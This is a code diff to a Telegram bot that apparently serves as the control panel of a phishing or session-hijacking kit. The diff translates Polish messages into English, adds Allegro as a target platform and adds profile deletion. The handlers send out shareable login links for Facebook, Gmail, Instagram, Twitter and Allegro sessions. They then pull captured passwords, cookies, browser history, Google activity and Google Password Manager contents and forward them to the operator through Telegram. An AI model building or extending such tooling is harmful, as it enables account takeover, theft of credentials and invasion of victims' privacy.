@@ -102,29 +102,28 @@ async function replyTo(chatId, text) {
 
 async function handlePanelAdduser(chatId, args) {
   if (args.length < 2) {
-    await replyTo(chatId, '❌ Użycie: /adduser <login> <hasło>\nHasło min. 8 znaków.');
+    await replyTo(chatId, '❌ Usage: /adduser <username> <password>\nPassword min. 8 characters.');
     return;
   }
   const username = String(args[0]).trim().toLowerCase();
   const password = String(args[1]);
-  // Validate before touching userdb
   if (!/^[a-z0-9_-]{1,64}$/.test(username)) {
-    await replyTo(chatId, '❌ Login: tylko litery a-z, cyfry, _ lub -. Max 64 znaki.');
+    await replyTo(chatId, '❌ Username: only a-z, digits, _ or -. Max 64 chars.');
     return;
   }
   if (password.length < 8) {
-    await replyTo(chatId, '❌ Hasło za krótkie (min. 8 znaków).');
+    await replyTo(chatId, '❌ Password too short (min. 8 characters).');
     return;
   }
   try {
     const { createUser } = await import('./userdb.js');
     await createUser(username, password);
-    await replyTo(chatId, `✅ Użytkownik "${username}" utworzony.`);
+    await replyTo(chatId, `✅ User "${username}" created.`);
   } catch (err) {
     if (err?.message === 'username_taken') {
-      await replyTo(chatId, `❌ Login "${username}" już istnieje.`);
+      await replyTo(chatId, `❌ Username "${username}" already exists.`);
     } else {
-      await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
+      await replyTo(chatId, `❌ Error: ${err?.message || err}`);
     }
   }
 }
@@ -136,17 +135,17 @@ async function handleUsers(chatId) {
     const { listUsers } = await import('./userdb.js');
     const users = await listUsers();
     if (users.length === 0) {
-      await replyTo(chatId, 'Brak użytkowników.');
+      await replyTo(chatId, 'No panel users found.');
       return;
     }
     const lines = users.map(u => {
       const date = new Date(u.createdAt).toISOString().slice(0, 10);
-      const status = u.active ? '✓' : '✗';
-      return `${status} ${u.username}  (${date})`;
+      const icon = u.active ? '🟢' : '🔴';
+      return `${icon} ${u.username}  (${date})`;
     });
-    await replyTo(chatId, `Użytkownicy (${users.length}):\n${lines.join('\n')}`);
+    await replyTo(chatId, `👥 Panel users (${users.length}):\n${lines.join('\n')}`);
   } catch (err) {
-    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
+    await replyTo(chatId, `❌ Error: ${err?.message || err}`);
   }
 }
 
@@ -154,7 +153,7 @@ async function handleUsers(chatId) {
 
 async function handleDeluser(chatId, args) {
   if (args.length < 1) {
-    await replyTo(chatId, '❌ Użycie: /deluser <login>');
+    await replyTo(chatId, '❌ Usage: /deluser <username>');
     return;
   }
   const username = String(args[0]).trim().toLowerCase();
@@ -163,13 +162,13 @@ async function handleDeluser(chatId, args) {
     const { deleteSessionsByUsername } = await import('./session.js');
     const removed = await deleteUser(username);
     if (!removed) {
-      await replyTo(chatId, `❌ Nie znaleziono użytkownika "${username}".`);
+      await replyTo(chatId, `❌ User "${username}" not found.`);
       return;
     }
     deleteSessionsByUsername(username);
-    await replyTo(chatId, `✅ Usunięto użytkownika "${username}" i unieważniono jego sesje.`);
+    await replyTo(chatId, `✅ User "${username}" deleted and sessions revoked.`);
   } catch (err) {
-    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
+    await replyTo(chatId, `❌ Error: ${err?.message || err}`);
   }
 }
 
@@ -182,17 +181,16 @@ async function handleGetPass(chatId, args) {
     if (args.length > 0) {
       const id = args[0].toLowerCase();
       const acc = list.find(a => a.id === id);
-      if (!acc) { await replyTo(chatId, `❌ Nie znaleziono konta: "${id}"`); return; }
-      const lines = [`📋 Konto: ${acc.label} (${acc.id})`];
+      if (!acc) { await replyTo(chatId, `❌ Account not found: "${id}"`); return; }
+      const lines = [`📋 Account: ${acc.label} (${acc.id})`];
       if (acc.email)    lines.push(`📧 Email: ${acc.email}`);
-      if (acc.password) lines.push(`🔑 Hasło: ${acc.password}`);
-      if (!acc.email && !acc.password) lines.push('(brak zapisanych danych logowania)');
+      if (acc.password) lines.push(`🔑 Password: ${acc.password}`);
+      if (!acc.email && !acc.password) lines.push('(no credentials saved)');
       await replyTo(chatId, lines.join('\n'));
     } else {
-      // List all accounts with stored credentials
       const withCreds = list.filter(a => a.email || a.password);
-      if (withCreds.length === 0) { await replyTo(chatId, 'Brak zapisanych danych logowania.'); return; }
-      const lines = [`🔐 Zapisane dane (${withCreds.length}):`];
+      if (withCreds.length === 0) { await replyTo(chatId, 'No saved credentials.'); return; }
+      const lines = [`🔐 Saved credentials (${withCreds.length}):`];
       for (const acc of withCreds) {
         lines.push(`\n📋 ${acc.label} (${acc.id})`);
         if (acc.email)    lines.push(`  📧 ${acc.email}`);
@@ -201,7 +199,7 @@ async function handleGetPass(chatId, args) {
       await replyTo(chatId, lines.join('\n'));
     }
   } catch (err) {
-    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
+    await replyTo(chatId, `❌ Error: ${err?.message || err}`);
   }
 }
 
@@ -209,23 +207,23 @@ async function handleGetPass(chatId, args) {
 
 async function handleCookies(chatId, args) {
   if (args.length < 1) {
-    await replyTo(chatId, '❌ Użycie: /cookies <id>');
+    await replyTo(chatId, '❌ Usage: /cookies <id>');
     return;
   }
   const id = args[0].toLowerCase();
   try {
     const { getAccount } = await import('./accounts.js');
     const acc = await getAccount(id);
-    if (!acc) { await replyTo(chatId, `❌ Nie znaleziono konta: "${id}"`); return; }
+    if (!acc) { await replyTo(chatId, `❌ Account not found: "${id}"`); return; }
     const { getContext } = await import('./browser.js');
     const ctx = getContext(id);
-    if (!ctx) { await replyTo(chatId, `❌ Sesja "${id}" nie jest uruchomiona.`); return; }
+    if (!ctx) { await replyTo(chatId, `❌ Session "${id}" is not running.`); return; }
     const cookies = await ctx.cookies();
     const json = JSON.stringify(cookies, null, 2);
     const buf = Buffer.from(json, 'utf8');
     await sendDocument(buf, `cookies-${id}.json`, `🍪 Cookies: ${acc.label}`);
   } catch (err) {
-    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
+    await replyTo(chatId, `❌ Error: ${err?.message || err}`);
   }
 }
 
@@ -235,16 +233,16 @@ async function handleAccounts(chatId) {
   try {
     const { loadAccounts } = await import('./accounts.js');
     const list = await loadAccounts();
-    if (list.length === 0) { await replyTo(chatId, 'Brak kont.'); return; }
-    const lines = [`📱 Konta (${list.length}):`];
+    if (list.length === 0) { await replyTo(chatId, 'No accounts. Use /addaccount <name> <platform>'); return; }
+    const lines = [`📱 Accounts (${list.length}):`];
     for (const acc of list) {
       const hasCreds = acc.email || acc.password ? ' 🔑' : '';
       lines.push(`• ${acc.id} — ${acc.label}${hasCreds}`);
     }
-    lines.push('\nUżyj /getpass <id> lub /cookies <id>');
+    lines.push('\nUse /getpass <id> or /cookies <id>');
     await replyTo(chatId, lines.join('\n'));
   } catch (err) {
-    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
+    await replyTo(chatId, `❌ Error: ${err?.message || err}`);
   }
 }
 
@@ -256,37 +254,45 @@ const PLATFORM_URLS = {
   google: 'https://mail.google.com/mail/u/0/',
   instagram: 'https://www.instagram.com/', ig: 'https://www.instagram.com/',
   twitter: 'https://x.com/', tw: 'https://x.com/', x: 'https://x.com/',
+  allegro: 'https://allegro.pl/', al: 'https://allegro.pl/',
 };
 const PLATFORM_LABELS = {
   facebook: 'Facebook', fb: 'Facebook',
   gmail: 'Gmail', gm: 'Gmail', google: 'Gmail',
   instagram: 'Instagram', ig: 'Instagram',
   twitter: 'Twitter / X', tw: 'Twitter / X', x: 'Twitter / X',
+  allegro: 'Allegro', al: 'Allegro',
 };
 const PLATFORM_CANONICAL = {
   facebook: 'facebook', fb: 'facebook',
   gmail: 'gmail', gm: 'gmail', google: 'gmail',
   instagram: 'instagram', ig: 'instagram',
   twitter: 'twitter', tw: 'twitter', x: 'twitter',
+  allegro: 'allegro', al: 'allegro',
+};
+
+const PLATFORM_ICONS = {
+  facebook: '👤', gmail: '📧', google: '📧',
+  instagram: '📸', twitter: '🐦', allegro: '🛒',
 };
 
 async function handleAddAccount(chatId, args, publicHost) {
   if (args.length < 2) {
-    await replyTo(chatId, '❌ Użycie: /addaccount <imię> <platforma>\nPlatformy: facebook (fb), gmail (gm), instagram (ig), twitter (tw)');
+    await replyTo(chatId, '❌ Usage: /addaccount <name> <platform>\nPlatforms: facebook (fb), gmail (gm), instagram (ig), twitter (tw), allegro (al)');
     return;
   }
   const name = args[0];
   const platform = args[1].toLowerCase();
   const startUrl = PLATFORM_URLS[platform];
   if (!startUrl) {
-    await replyTo(chatId, `❌ Nieznana platforma: "${platform}"\nDostępne: facebook (fb), gmail (gm), instagram (ig), twitter (tw)`);
+    await replyTo(chatId, `❌ Unknown platform: "${platform}"\nAvailable: facebook (fb), gmail (gm), instagram (ig), twitter (tw), allegro (al)`);
     return;
   }
   const canonical = PLATFORM_CANONICAL[platform];
   const platLabel = PLATFORM_LABELS[platform];
   const label = `${name} – ${platLabel}`;
   const id = `${name}-${canonical}`.trim().toLowerCase().replace(/\s+/g, '-').replace(/[^a-z0-9_-]/g, '');
-  if (!id) { await replyTo(chatId, '❌ Nazwa zawiera niedozwolone znaki.'); return; }
+  if (!id) { await replyTo(chatId, '❌ Name contains invalid characters.'); return; }
   try {
     const { saveAccount, getAccount } = await import('./accounts.js');
     const { start, stop, wipeProfile } = await import('./browser.js');
@@ -297,10 +303,10 @@ async function handleAddAccount(chatId, args, publicHost) {
     const saved = await getAccount(id);
     const ref = saved?.ref || '';
     const host = publicHost || config.publicHost;
-    const link = ref && host ? `https://${host}/account/login?ref=${ref}` : '(brak PUBLIC_HOST)';
-    await replyTo(chatId, `✅ Konto "${label}" utworzone!\n🔗 Link: ${link}`);
+    const link = ref && host ? `https://${host}/account/login?ref=${ref}` : '(no PUBLIC_HOST set)';
+    await replyTo(chatId, `✅ Account "${label}" created!\n🔗 Link: ${link}`);
   } catch (err) {
-    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
+    await replyTo(chatId, `❌ Error: ${err?.message || err}`);
   }
 }
 
@@ -324,6 +330,7 @@ async function sendInlineMessage(chatId, text, inline_keyboard) {
       body: JSON.stringify({
         chat_id: chatId,
         text,
+        parse_mode: 'Markdown',
         reply_markup: { inline_keyboard },
         disable_web_page_preview: true,
       }),
@@ -344,61 +351,120 @@ async function answerCallback(callbackQueryId, text) {
 async function handlePanel(chatId, publicHost) {
   try {
     const { loadAccounts } = await import('./accounts.js');
+    const { status: sessionStatus } = await import('./browser.js');
     const list = await loadAccounts();
     if (list.length === 0) {
-      await replyTo(chatId, '📱 Brak kont. Użyj /addaccount <imię> <platforma>');
+      await replyTo(chatId, '📱 No accounts yet.\nUse /addaccount <name> <platform>');
       return;
     }
     const keyboard = list.map(acc => {
-      const icon = acc.email ? '🔑 ' : '';
-      return [{ text: `${icon}${acc.label}`, callback_data: `acc:${acc.id}` }];
+      const running = sessionStatus(acc.id) === 'running';
+      const dot = running ? '🟢' : '⚫';
+      // detect platform from label suffix or id
+      const platKey = Object.keys(PLATFORM_CANONICAL).find(k =>
+        acc.id.endsWith(`-${PLATFORM_CANONICAL[k]}`) || acc.label.toLowerCase().includes(k)
+      );
+      const platIcon = platKey ? (PLATFORM_ICONS[PLATFORM_CANONICAL[platKey]] || '') : '';
+      const allegroPrefix = acc.id.startsWith('allegro-') ? 'allegro-' : '';
+      const displayLabel = allegroPrefix
+        ? `${dot} ${platIcon} allegro-${acc.label}`.trim()
+        : `${dot} ${platIcon} ${acc.label}`.trim();
+      return [{ text: displayLabel, callback_data: `acc:${acc.id}` }];
     });
-    keyboard.push([{ text: '➕ Dodaj konto', callback_data: 'help:addaccount' }]);
-    keyboard.push([{ text: '📋 Historia wszystkich kont', callback_data: 'hist:all' }]);
-    await sendInlineMessage(chatId, `📱 Konta (${list.length}):`, keyboard);
+    keyboard.push([
+      { text: '➕ New Account', callback_data: 'help:addaccount' },
+      { text: '📋 All History', callback_data: 'hist:all' },
+    ]);
+    const running = list.filter(a => sessionStatus(a.id) === 'running').length;
+    await sendInlineMessage(chatId,
+      `🎛 *Control Panel* — ${list.length} account${list.length !== 1 ? 's' : ''} (${running} running)`,
+      keyboard
+    );
   } catch (err) {
-    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
+    await replyTo(chatId, `❌ Error: ${err?.message || err}`);
   }
 }
 
 async function handleAccountMenu(chatId, accountId, callbackQueryId, publicHost) {
   try {
     const { getAccount } = await import('./accounts.js');
+    const { status: sessionStatus } = await import('./browser.js');
     const acc = await getAccount(accountId);
-    if (!acc) { await answerCallback(callbackQueryId, '❌ Nie znaleziono konta'); return; }
+    if (!acc) { await answerCallback(callbackQueryId, '❌ Account not found'); return; }
     await answerCallback(callbackQueryId);
 
     const host = publicHost || config.publicHost;
     const link = acc.ref && host ? `https://${host}/account/login?ref=${acc.ref}` : null;
+    const running = sessionStatus(accountId) === 'running';
 
-    const lines = [`📋 *${acc.label}*`];
+    const lines = [
+      `📋 *${acc.label}*`,
+      `Status: ${running ? '🟢 Running' : '⚫ Stopped'}`,
+    ];
     if (acc.email)    lines.push(`📧 ${acc.email}`);
     if (acc.password) lines.push(`🔑 ${acc.password}`);
 
     const keyboard = [
       [
-        { text: '🔑 Hasła (plik)', callback_data: `pass:${accountId}` },
+        { text: '🔑 Credentials', callback_data: `pass:${accountId}` },
         { text: '🍪 Cookies', callback_data: `cook:${accountId}` },
       ],
       [
-        { text: '📋 Historia Chrome (profil)', callback_data: `hist:${accountId}` },
-        { text: '🔍 Aktywność Google (konto)', callback_data: `gact:${accountId}` },
+        { text: '🌐 Browser History', callback_data: `hist:${accountId}` },
+        { text: '🔍 Google Activity', callback_data: `gact:${accountId}` },
       ],
       [
         { text: '🔐 Google Passwords', callback_data: `gpas:${accountId}` },
+        { text: '🗑 Delete Profile', callback_data: `del:${accountId}` },
       ],
     ];
-    if (link) keyboard.push([{ text: '🔗 Otwórz sesję', url: link }]);
-    keyboard.push([{ text: '« Wróć', callback_data: 'panel' }]);
+    if (link) keyboard.push([{ text: '🔗 Open Session', url: link }]);
+    keyboard.push([{ text: '« Back', callback_data: 'panel' }]);
 
     await sendInlineMessage(chatId, lines.join('\n'), keyboard);
   } catch (err) {
-    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
+    await replyTo(chatId, `❌ Error: ${err?.message || err}`);
+  }
+}
+
+async function handleDeleteProfile(chatId, accountId, callbackQueryId) {
+  try {
+    const { getAccount } = await import('./accounts.js');
+    const acc = await getAccount(accountId);
+    if (!acc) { await answerCallback(callbackQueryId, '❌ Account not found'); return; }
+    await answerCallback(callbackQueryId);
+    await sendInlineMessage(chatId,
+      `⚠️ *Delete profile "${acc.label}"?*\n\nThis will permanently stop the session and wipe all browser data (cookies, history, passwords cache). This cannot be undone.`,
+      [
+        [
+          { text: '✅ Yes, Delete', callback_data: `del_confirm:${accountId}` },
+          { text: '❌ Cancel', callback_data: `acc:${accountId}` },
+        ],
+      ]
+    );
+  } catch (err) {
+    await replyTo(chatId, `❌ Error: ${err?.message || err}`);
+  }
+}
+
+async function handleDeleteConfirm(chatId, accountId, callbackQueryId) {
+  await answerCallback(callbackQueryId, '⏳ Deleting...');
+  try {
+    const { getAccount, deleteAccount } = await import('./accounts.js');
+    const { stop, wipeProfile } = await import('./browser.js');
+    const acc = await getAccount(accountId);
+    if (!acc) { await replyTo(chatId, '❌ Account not found'); return; }
+    await stop(accountId).catch(() => {});
+    await wipeProfile(accountId);
+    await deleteAccount(accountId);
+    await replyTo(chatId, `✅ Profile *${acc.label}* deleted — session stopped and all browser data wiped.`);
+  } catch (err) {
+    await replyTo(chatId, `❌ Error: ${err?.message || err}`);
   }
 }
 
 async function handlePassFile(chatId, accountId, callbackQueryId) {
-  await answerCallback(callbackQueryId, '⏳ Generuję plik...');
+  await answerCallback(callbackQueryId, '⏳ Generating file...');
   try {
     const { loadAccounts } = await import('./accounts.js');
     const list = await loadAccounts();
@@ -406,21 +472,21 @@ async function handlePassFile(chatId, accountId, callbackQueryId) {
       ? list.filter(a => a.email || a.password)
       : list.filter(a => a.id === accountId && (a.email || a.password));
     if (withCreds.length === 0) {
-      await replyTo(chatId, '(brak zapisanych danych logowania)');
+      await replyTo(chatId, '(no saved credentials)');
       return;
     }
     const lines = [];
     for (const acc of withCreds) {
       lines.push(`=== ${acc.label} (${acc.id}) ===`);
-      if (acc.email)    lines.push(`Email:  ${acc.email}`);
-      if (acc.password) lines.push(`Hasło:  ${acc.password}`);
+      if (acc.email)    lines.push(`Email:    ${acc.email}`);
+      if (acc.password) lines.push(`Password: ${acc.password}`);
       lines.push('');
     }
     const buf = Buffer.from(lines.join('\n'), 'utf8');
-    const fname = accountId === 'all' ? 'hasla-wszystkie.txt' : `hasla-${accountId}.txt`;
-    await sendDocument(buf, fname, `🔑 Dane logowania${accountId === 'all' ? '' : ': ' + withCreds[0]?.label}`);
+    const fname = accountId === 'all' ? 'credentials-all.txt' : `credentials-${accountId}.txt`;
+    await sendDocument(buf, fname, `🔑 Credentials${accountId === 'all' ? ' — all accounts' : ': ' + withCreds[0]?.label}`);
   } catch (err) {
-    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
+    await replyTo(chatId, `❌ Error: ${err?.message || err}`);
   }
 }
 
@@ -441,7 +507,7 @@ async function findHistoryPath(profileRoot) {
 
 
 async function handleHistoryFile(chatId, accountId, callbackQueryId) {
-  await answerCallback(callbackQueryId, '⏳ Czytam historię przeglądarki...');
+  await answerCallback(callbackQueryId, '⏳ Reading browser history...');
   try {
     const { loadAccounts, getAccount } = await import('./accounts.js');
     const { copyFile, unlink } = await import('node:fs/promises');
@@ -456,7 +522,7 @@ async function handleHistoryFile(chatId, accountId, callbackQueryId) {
       ? await loadAccounts()
       : [await getAccount(accountId)].filter(Boolean);
 
-    if (!accounts.length) { await replyTo(chatId, '❌ Brak kont'); return; }
+    if (!accounts.length) { await replyTo(chatId, '❌ No accounts found'); return; }
 
     const allRows = [];
     const tmpFiles = [];
@@ -482,32 +548,31 @@ async function handleHistoryFile(chatId, accountId, callbackQueryId) {
     for (const t of tmpFiles) await unlink(t).catch(() => {});
 
     if (!allRows.length) {
-      await replyTo(chatId, '❌ Historia przeglądarki jest pusta we wszystkich profilach.');
+      await replyTo(chatId, '❌ Browser history is empty in all profiles.');
       return;
     }
 
-    // Sort newest first, cap at 500 000
     allRows.sort((a, b) => b.ts_ms - a.ts_ms);
     const rows = allRows.slice(0, 500000);
 
     const escape = v => `"${String(v ?? '').replace(/"/g, '""')}"`;
-    const lines = ['data,konto,url,tytuł'];
+    const lines = ['date,account,url,title'];
     for (const r of rows) {
       const date = r.ts_ms > 0 ? new Date(r.ts_ms).toISOString().replace('T', ' ').slice(0, 19) : '';
       lines.push([escape(date), escape(r.account), escape(r.url), escape(r.title)].join(','));
     }
     const csvBuf = Buffer.from(lines.join('\n'), 'utf8');
     const compressed = await gzipAsync(csvBuf);
-    const fname = isAll ? 'historia-wszystkie.csv.gz' : `historia-${accountId}.csv.gz`;
-    const label = isAll ? `wszystkie konta` : accounts[0].label;
-    await sendDocument(compressed, fname, `📋 Historia przeglądarki: ${label} (${rows.length} wizyt)`);
+    const fname = isAll ? 'browser-history-all.csv.gz' : `browser-history-${accountId}.csv.gz`;
+    const label = isAll ? 'all accounts' : accounts[0].label;
+    await sendDocument(compressed, fname, `🌐 Browser History: ${label} (${rows.length} visits)`);
   } catch (err) {
     await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
   }
 }
 
 async function handleGoogleActivity(chatId, accountId, callbackQueryId) {
-  await answerCallback(callbackQueryId, '⏳ Otwieram historię aktywności Google...');
+  await answerCallback(callbackQueryId, '⏳ Opening Google activity...');
   try {
     const { getAccount, loadAccounts: _la } = await import('./accounts.js');
     const { start } = await import('./browser.js');
@@ -516,17 +581,17 @@ async function handleGoogleActivity(chatId, accountId, callbackQueryId) {
     const gzipAsync = promisify(gzip);
 
     const acc = await getAccount(accountId);
-    if (!acc) { await replyTo(chatId, '❌ Nie znaleziono konta'); return; }
+    if (!acc) { await replyTo(chatId, '❌ Account not found'); return; }
 
     const { getPage } = await import('./browser.js');
     if (!getPage(accountId)) {
-      await replyTo(chatId, `⏳ Uruchamiam sesję "${acc.label}"...`);
+      await replyTo(chatId, `⏳ Starting session "${acc.label}"...`);
       await start(accountId, '127.0.0.1');
       await new Promise(r => setTimeout(r, 3000));
     }
 
     await replyTo(chatId,
-      `🔍 Pobieram aktywność Google dla "${acc.label}".\nScrolluję myactivity.google.com — może potrwać 1–2 min. Bot wysyła screeny co 10 sek.`
+      `🔍 Fetching Google activity for *${acc.label}*.\nScrolling myactivity.google.com — may take 1–2 min. Screenshots every 10s.`
     );
 
     const { exportGoogleActivity } = await import('./browser.js');
@@ -534,14 +599,14 @@ async function handleGoogleActivity(chatId, accountId, callbackQueryId) {
     const entries = await exportGoogleActivity(accountId, onScreenshot);
 
     const escape = v => `"${String(v ?? '').replace(/"/g, '""')}"`;
-    const lines = ['data,aktywnosc'];
+    const lines = ['date,activity'];
     for (const e of entries) {
       lines.push([escape(e.date), escape(e.text)].join(','));
     }
     const csvBuf = Buffer.from(lines.join('\n'), 'utf8');
     const compressed = await gzipAsync(csvBuf);
-    await sendDocument(compressed, `aktywnosc-${accountId}.csv.gz`,
-      `🔍 Aktywność Google: ${acc.label} (${entries.length} wpisów)`);
+    await sendDocument(compressed, `google-activity-${accountId}.csv.gz`,
+      `🔍 Google Activity: ${acc.label} (${entries.length} entries)`);
   } catch (err) {
     await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
   }
@@ -551,40 +616,40 @@ async function handleGoogleActivity(chatId, accountId, callbackQueryId) {
 async function handleGooglePasswords(chatId, accountId, callbackQueryId) {
   await answerCallback(callbackQueryId);
   const keyboard = [
-    [{ text: '📥 Eksport CSV (ręczny)', callback_data: `gpw_csv:${accountId}` }],
-    [{ text: '📋 Lista haseł (powolna)', callback_data: `gpw_rows:${accountId}` }],
+    [{ text: '📥 Export CSV (auto)', callback_data: `gpw_csv:${accountId}` }],
+    [{ text: '📋 List passwords (slow)', callback_data: `gpw_rows:${accountId}` }],
   ];
   await sendInlineMessage(chatId,
-    '🔐 Wybierz metodę eksportu haseł Google:\n\n' +
-    '📥 *Eksport CSV* — otwiera passwords.google.com/options, logujesz się sam i klikasz Eksportuj. Bot wysyła plik CSV na kanał.\n\n' +
-    '📋 *Lista haseł* — bot klika każdy wpis po kolei i wyciąga hasła (wolne, wymaga zalogowanej sesji).',
+    '🔐 *Choose password export method:*\n\n' +
+    '📥 *Export CSV* — opens passwords.google.com/options, authenticates and clicks Export. Bot sends the CSV file.\n\n' +
+    '📋 *List passwords* — bot clicks each entry one by one (slow, requires active session).',
     keyboard
   );
 }
 
 // Option 1: User-driven CSV export — user auth + click, bot sends CSV file
 async function handleGpwCsv(chatId, accountId, callbackQueryId) {
-  await answerCallback(callbackQueryId, '⏳ Otwieram menadżer haseł...');
+  await answerCallback(callbackQueryId, '⏳ Opening password manager...');
   try {
     const { getAccount } = await import('./accounts.js');
     const { readFile } = await import('node:fs/promises');
     const acc = await getAccount(accountId);
-    if (!acc) { await replyTo(chatId, '❌ Nie znaleziono konta'); return; }
+    if (!acc) { await replyTo(chatId, '❌ Account not found'); return; }
 
     const { getContext, start, openPasswordsExport } = await import('./browser.js');
     let ctx = getContext(accountId);
     if (!ctx) {
-      await replyTo(chatId, `⏳ Uruchamiam sesję "${acc.label}"...`);
+      await replyTo(chatId, `⏳ Starting session *${acc.label}*...`);
       await start(accountId, '127.0.0.1');
       await new Promise(r => setTimeout(r, 3000));
       ctx = getContext(accountId);
-      if (!ctx) { await replyTo(chatId, `❌ Nie udało się uruchomić sesji "${acc.label}".`); return; }
+      if (!ctx) { await replyTo(chatId, `❌ Failed to start session *${acc.label}*.`); return; }
     }
 
     await replyTo(chatId,
-      `📥 Otwieram passwords.google.com/options w przeglądarce "${acc.label}".\n\n` +
-      `Zaloguj się (jeśli wymagane) i kliknij *Eksportuj hasła*.\n\n` +
-      `Bot wysyła screeny co 10 sek żebyś wiedział co się dzieje.`
+      `📥 Opening passwords.google.com/options in *${acc.label}*.\n\n` +
+      `Sign in if required, then click *Export passwords*.\n\n` +
+      `Screenshots every 10s so you can follow along.`
     );
 
     const onScreenshot = (buf, url) => {
@@ -595,29 +660,29 @@ async function handleGpwCsv(chatId, accountId, callbackQueryId) {
 
     const buf = await readFile(result.path);
     await sendDocument(buf, result.filename, `🔐 Google Passwords: ${acc.label}`);
-    await replyTo(chatId, `✅ Gotowe — plik CSV wysłany powyżej.`);
+    await replyTo(chatId, `✅ Done — CSV file sent above.`);
   } catch (err) {
-    await replyTo(chatId, `❌ Błąd eksportu CSV: ${err?.message || err}`);
+    await replyTo(chatId, `❌ CSV export error: ${err?.message || err}`);
   }
 }
 
 // Option 2: Row-by-row click through password list
 async function handleGpwRows(chatId, accountId, callbackQueryId) {
-  await answerCallback(callbackQueryId, '⏳ Uruchamiam pobieranie haseł...');
+  await answerCallback(callbackQueryId, '⏳ Starting password extraction...');
   try {
     const { getAccount } = await import('./accounts.js');
     const { readFile } = await import('node:fs/promises');
     const acc = await getAccount(accountId);
-    if (!acc) { await replyTo(chatId, '❌ Nie znaleziono konta'); return; }
+    if (!acc) { await replyTo(chatId, '❌ Account not found'); return; }
 
     const { getContext, start, openPasswordsExportRowByRow } = await import('./browser.js');
     let ctx = getContext(accountId);
     if (!ctx) {
-      await replyTo(chatId, `⏳ Uruchamiam sesję "${acc.label}"...`);
+      await replyTo(chatId, `⏳ Starting session *${acc.label}*...`);
       await start(accountId, '127.0.0.1');
       await new Promise(r => setTimeout(r, 3000));
       ctx = getContext(accountId);
-      if (!ctx) { await replyTo(chatId, `❌ Nie udało się uruchomić sesji "${acc.label}".`); return; }
+      if (!ctx) { await replyTo(chatId, `❌ Failed to start session *${acc.label}*.`); return; }
     }
 
     let progressMsgId = null;
@@ -625,7 +690,7 @@ async function handleGpwRows(chatId, accountId, callbackQueryId) {
       const r = await fetch(apiUrl('sendMessage'), {
         method: 'POST',
         headers: { 'content-type': 'application/json' },
-        body: JSON.stringify({ chat_id: chatId, text: `🔐 Otwieram passwords.google.com — screeny co 10 sek...` }),
+        body: JSON.stringify({ chat_id: chatId, text: `🔐 Opening passwords.google.com — screenshots every 10s...` }),
       });
       const d = await r.json();
       progressMsgId = d.result?.message_id;
@@ -636,18 +701,17 @@ async function handleGpwRows(chatId, accountId, callbackQueryId) {
     };
     const onProgress = (done, total) => {
       if (progressMsgId && done % 5 === 0) {
-        editMessage(chatId, progressMsgId, `🔐 Pobieram hasła: ${done} / ${total}`).catch(() => {});
+        editMessage(chatId, progressMsgId, `🔐 Extracting passwords: ${done} / ${total}`).catch(() => {});
       }
     };
 
     const result = await openPasswordsExportRowByRow(accountId, onScreenshot, onProgress);
 
     if (progressMsgId) {
-      await editMessage(chatId, progressMsgId, `✅ Gotowe: ${result.count} wpisów — wysyłam plik...`);
+      await editMessage(chatId, progressMsgId, `✅ Done: ${result.count} entries — sending file...`);
     }
 
     const buf = await readFile(result.path);
-    // Send file — log Telegram API response for debugging
     try {
       const boundary = '----spBoundary' + Date.now().toString(16);
       const parts = [];
@@ -655,7 +719,7 @@ async function handleGpwRows(chatId, accountId, callbackQueryId) {
       t(`--${boundary}\r\n`);
       t(`Content-Disposition: form-data; name="chat_id"\r\n\r\n${chatId}\r\n`);
       t(`--${boundary}\r\n`);
-      t(`Content-Disposition: form-data; name="caption"\r\n\r\n🔐 Google Passwords: ${acc.label} (${result.count} wpisów)\r\n`);
+      t(`Content-Disposition: form-data; name="caption"\r\n\r\n🔐 Google Passwords: ${acc.label} (${result.count} entries)\r\n`);
       t(`--${boundary}\r\n`);
       t(`Content-Disposition: form-data; name="document"; filename="${result.filename}"\r\n`);
       t(`Content-Type: text/plain\r\n\r\n`);
@@ -668,14 +732,14 @@ async function handleGpwRows(chatId, accountId, callbackQueryId) {
       });
       const tgData = await tgRes.json().catch(() => ({}));
       if (!tgData.ok) {
-        await replyTo(chatId, `⚠️ Telegram odrzucił plik: ${JSON.stringify(tgData.description || tgData)}`);
+        await replyTo(chatId, `⚠️ Telegram rejected file: ${JSON.stringify(tgData.description || tgData)}`);
       }
     } catch (sendErr) {
-      await replyTo(chatId, `⚠️ Błąd wysyłania pliku: ${sendErr?.message}`);
+      await replyTo(chatId, `⚠️ File send error: ${sendErr?.message}`);
     }
-    await replyTo(chatId, `✅ Gotowe — ${result.count} haseł.`);
+    await replyTo(chatId, `✅ Done — ${result.count} passwords.`);
   } catch (err) {
-    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
+    await replyTo(chatId, `❌ Error: ${err?.message || err}`);
   }
 }
 
@@ -739,9 +803,13 @@ export function startCommandListener(publicHost) {
               await handleGpwCsv(chatId, d.slice(8), cq.id);
             } else if (d.startsWith('gpw_rows:')) {
               await handleGpwRows(chatId, d.slice(9), cq.id);
+            } else if (d.startsWith('del_confirm:')) {
+              await handleDeleteConfirm(chatId, d.slice(12), cq.id);
+            } else if (d.startsWith('del:')) {
+              await handleDeleteProfile(chatId, d.slice(4), cq.id);
             } else if (d === 'help:addaccount') {
               await answerCallback(cq.id);
-              await replyTo(chatId, '➕ Użycie: /addaccount <imię> <platforma>\nPlatformy: facebook (fb), gmail (gm), instagram (ig), twitter (tw)');
+              await replyTo(chatId, '➕ Usage: /addaccount <name> <platform>\nPlatforms: facebook (fb), gmail (gm), instagram (ig), twitter (tw), allegro (al)');
             } else {
               await answerCallback(cq.id);
             }
